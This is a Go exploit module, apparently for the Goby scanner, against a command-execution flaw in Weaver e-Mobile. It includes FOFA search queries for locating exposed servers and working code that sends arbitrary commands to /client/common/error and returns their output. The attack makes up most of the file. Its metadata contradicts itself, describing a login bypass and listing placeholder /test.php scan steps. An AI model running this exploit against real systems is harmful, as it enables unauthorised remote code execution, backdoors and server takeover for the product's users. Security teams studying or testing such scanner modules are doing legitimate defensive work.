package exploits

import (
	"errors"
	"net/url"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Weaver e-Mobile /client/common/error Command Execution Vulnerability",
    "Description": "<p>Weaver e-Mobile has a login bypass vulnerability, through which attackers may be able to bypass the login, illegally enter the system, maliciously operate, or collect information for further attacks and exploitation.</p>",
    "Product": "Weaver-EMobile",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-10-14",
    "PostTime": "2024-10-18",
    "Author": "2987612621@qq.com",
    "FofaQuery": "(body=\"content=\\\"Weaver E-mobile\\\"\" || (body=\"E-Mobile \" && body=\"action=\\\"/verifyLogin.do\") || body=\"/images/login_logo@2x.png\" || (body=\"window.apiprifix = \\\"/emp\\\";\" && title=\"移动管理平台\"))",
    "GobyQuery": "(body=\"content=\\\"Weaver E-mobile\\\"\" || (body=\"E-Mobile \" && body=\"action=\\\"/verifyLogin.do\") || body=\"/images/login_logo@2x.png\" || (body=\"window.apiprifix = \\\"/emp\\\";\" && title=\"移动管理平台\"))",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2.Set access policies and whitelist access through security devices such as firewalls. </p><p>3.If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/weixin_43167326/article/details/142922897"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "泛微e-Mobile /client/common/error 命令执行漏洞",
            "Product": "泛微-EMobile",
            "Description": "<p>&nbsp;泛微-EMobile存在登录绕过漏洞，攻击者可能通过尝绕过登录，非法进入系统，恶意操作或者收集信息进一步攻击利用。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本 <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Weaver e-Mobile /client/common/error Command Execution Vulnerability",
            "Product": "Weaver-EMobile",
            "Description": "<p>Weaver e-Mobile has a login bypass vulnerability, through which attackers may be able to bypass the login, illegally enter the system, maliciously operate, or collect information for further attacks and exploitation.<br></p>",
            "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2.Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`

	setPayloadRequestHashwsaiklhjflasikfnhkljasd := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		encode_command := url.QueryEscape(command)
		vulPath := "/client/common/error?a=" + encode_command

		GetRequestConfig := httpclient.NewGetRequestConfig(vulPath)
		GetRequestConfig.VerifyTls = false
		GetRequestConfig.FollowRedirect = false

		//请求头
		head := map[string]string{
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		}

		for headName, headValue := range head {
			GetRequestConfig.Header.Store(headName, headValue)
		}
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, GetRequestConfig)
		if err != nil || response == nil {
			return "", "", err
		} //错误检查

		regStr := `<cmd>([\s\S]*?)</cmd>` //正则表达式
		regObj := regexp.MustCompile(regStr)
		if !regObj.MatchString(response.RawBody) {
			return "", "", errors.New("RCE Fail")
		}
		getname := regObj.FindStringSubmatch(response.RawBody)

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := getname[1]
		if len(commandResult) == 0 {
			return "", "", errors.New("RCE Fail")
		}

		return commandResult, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashwsaiklhjflasikfnhkljasd

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashwsaiklhjflasikfnhkljasd

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			}
			return expResult
		},
	))
}
